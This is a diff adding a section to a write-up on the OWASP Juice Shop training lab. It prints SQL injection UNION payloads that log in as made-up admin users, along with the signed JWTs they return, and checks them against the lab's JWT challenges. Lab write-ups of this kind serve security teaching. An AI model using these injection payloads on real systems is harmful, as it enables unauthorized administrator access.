@@ -104,3 +104,36 @@ Boom! I'm an admin that doesn't exist! To finish this off, I went to the adminis
 
 <img src="images/nonexistent-user-admin-token-admin-page.png">
 
+### Differences from the Current JWT Challenges
+
+There are 2 different JWT challenges. They both mention that the token should be unsigned or almost properly signed, but I actually have a properly signed JWT token now. Hmm... Let's try using this method and see if we complete the challenges.
+
+> **JWT Issues Tier 1 (T5)**
+> Forge an essentially unsigned JWT token that impersonates the (non-existing) user jwtn3d@juice-sh.op.
+
+```
+' UNION SELECT * FROM (SELECT 1001 as 'id', '' as 'username', 'jwtn3d@juice-sh.op' as 'email', 'b4448762fc877c2d57b2c9723118d264' as 'password', 1 as 'isAdmin', '0.0.0.0' as 'lastLoginIp' , 'default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '2019-08-16 14:14:41.644 +00:00' as 'createdAt', '2019-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--
+```
+
+**jwtn3d@juice-sh.op JWT Token**
+```
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTAwMSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6Imp3dG4zZEBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiYjQ0NDg3NjJmYzg3N2MyZDU3YjJjOTcyMzExOGQyNjQiLCJpc0FkbWluIjp0cnVlLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiJkZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAxOS0wOC0xNiAxNDoxNDo0MS42NDQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAxOS0wOC0xNiAxNDozMzo0MS45MzAgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNTY1OTc3NTEzLCJleHAiOjE1NjU5OTU1MTN9.yIlgAEaeL7sgF-rjoU1wTmZMmBpz1Zr2KIl5wbkcDCkRhi-Tc9H-FNBocaOMGYpIwmoMUfLpCaWxlC_qcDZLlvGRArdS0-svgOKwUujxLTrJhbqQIYsTmEkTMruNFYhRgrCijFhnYsOyqqWDSlW_n1NyRUYtMgtAMIezVl4UAuE
+```
+Challenge not complete even with the above token!
+
+> **JWT Issues Tier 2 (T6)**
+> Forge an almost properly RSA-signed JWT token that impersonates the (non-existing) user rsa_lord@juice-sh.op.
+
+**Injection Payload**
+```
+' UNION SELECT * FROM (SELECT 999 as 'id', '' as 'username', 'rsa_lord@juice-sh.op' as 'email', 'b4448762fc877c2d57b2c9723118d264' as 'password', 1 as 'isAdmin', '0.0.0.0' as 'lastLoginIp' , 'default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '2019-08-16 14:14:41.644 +00:00' as 'createdAt', '2019-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--
+```
+
+**rsa_lord@juice-sh.op JWT Token**
+```
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6OTk5LCJ1c2VybmFtZSI6IiIsImVtYWlsIjoicnNhX2xvcmRAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6ImI0NDQ4NzYyZmM4NzdjMmQ1N2IyYzk3MjMxMThkMjY0IiwiaXNBZG1pbiI6dHJ1ZSwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMTktMDgtMTYgMTQ6MTQ6NDEuNjQ0ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTktMDgtMTYgMTQ6MzM6NDEuOTMwICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTU2NTk3NzI3MywiZXhwIjoxNTY1OTk1MjczfQ.uOxQ5gPiTT-MCmGsgOE0NodOG77UqSRizHbsD-tvjt8X73V8SDkXfxFRQ4kjf3O1iyzK2BmWsrMk66GILz7HT5nNvEhdGHT9nTA5nBjXncCEy13xnNAwfi8qyJO8SMLCyCnMrx4RtC0X3VbY6kR2aJ7F5FL6q8V6Qp_4SO2SLeo
+```
+Challenge not complete even with the above token!
+
+So, its doesn't match either of these challenges, which makes sense. Yay! I found a way to get a legit token for a non-existent user. 
+
